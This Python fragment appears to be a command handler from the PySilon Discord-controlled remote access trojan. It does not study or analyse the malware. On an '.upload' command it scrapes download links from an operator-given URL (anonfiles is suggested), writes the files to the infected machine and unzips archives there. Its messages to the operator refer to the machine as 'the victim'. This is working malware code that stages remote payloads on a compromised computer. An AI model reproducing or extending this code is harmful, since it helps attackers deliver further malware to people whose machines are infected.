from bs4 import BeautifulSoup
import requests
from zipfile import ZipFile
# end of imports

# on message
elif message.content[:7] == '.upload':
    url = message.content[8:]
    await message.channel.send(f'```Uploading from: {url}.```')
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', {'class': 'btn btn-primary btn-block'})
        for link in links:
            try:
                file_url = link['href']
                file_name = file_url.split('/')[-1]
                with open(file_name, 'wb') as f:
                    f.write(requests.get(file_url).content)
                    f.close()
            except Exception as e:
                await message.channel.send(f'```Error while downloading specific file ({file_name}): {e}```')
                pass
        if len(links) == 1:
            if file_name.split('.')[-1] == 'zip':
                with ZipFile(file_name, 'r') as zip:
                    zip.extractall()
                    await message.channel.send('```Uploaded and extracted all files from the link to the victim.\nFiles will be located in the pysilon directory.```')
            else:
                await message.channel.send('```Uploaded all files from the link to the victim.\nFiles will be located in the pysilon directory.```')
    except Exception as e:
        await message.channel.send(f'```Error while downloading from the link.\nUsage: .upload <link>\nDo not upload the link to to the file directly.\nGood: https://anonfiles.com/k5X7D...\nBad: https://anonfiles.com/k5X7D.../file-name```')
        pass
